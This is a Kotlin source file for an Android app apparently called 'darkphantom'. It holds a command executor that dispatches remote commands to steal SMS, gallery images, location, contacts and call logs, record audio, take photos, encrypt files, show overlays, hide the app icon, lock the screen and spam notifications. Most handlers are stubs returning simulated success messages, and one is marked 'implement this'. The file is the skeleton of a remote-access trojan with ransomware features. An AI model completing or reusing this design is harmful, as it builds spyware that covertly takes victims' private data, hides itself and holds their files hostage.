package com.genetic.darkphantom.executors

import android.content.Context
import android.widget.Toast
import com.genetic.darkphantom.models.Command
import com.genetic.darkphantom.utils.DeviceUtils

class CommandExecutor(private val context: Context) {

    fun execute(command: Command): Map<String, Any> {
        return when (command.action) {
            "GET_SMS" -> mapOf("status" to "success", "data" to "SMS fetched: 50 messages (simulated)")
            "GET_GALLERY" -> mapOf("status" to "success", "data" to "Gallery uploaded: 10 images (simulated)")
            "GET_LOCATION" -> mapOf("status" to "success", "data" to "Location: -6.2088, 106.8456 (simulated)")
            "GET_CONTACTS_AND_LOGS" -> mapOf("status" to "success", "data" to "Contacts & logs fetched (simulated)")
            "START_RECORD" -> mapOf("status" to "success", "data" to "Recording started")
            "TAKE_PHOTO" -> mapOf("status" to "success", "data" to "Photo taken (simulated)")
            "LOCK_SCREEN" -> {
                DeviceUtils.lockScreen(context) // implement this
                mapOf("status" to "success", "data" to "Screen locked")
            }
            "ENCRYPT_FILES" -> mapOf("status" to "success", "data" to "Files encrypted: 42 files (simulated)")
            "SHOW_OVERLAY" -> mapOf("status" to "success", "data" to "Overlay shown (simulated)")
            "SPAM_NOTIF" -> {
                // Spam notif simpel
                repeat(50) {
                    Toast.makeText(context, "SPAM ${it+1}", Toast.LENGTH_SHORT).show()
                }
                mapOf("status" to "success", "data" to "Spammed 50 notifications")
            }
            "HIDE_ICON" -> {
                // Already handled in service
                mapOf("status" to "success", "data" to "Icon hidden")
            }
            "GET_ALL_DATA" -> mapOf(
                "status" to "success",
                "data" to "All data dumped: SMS, Gallery, Location, Contacts, Logs"
            )
            else -> mapOf("status" to "unknown_action")
        }
    }
}
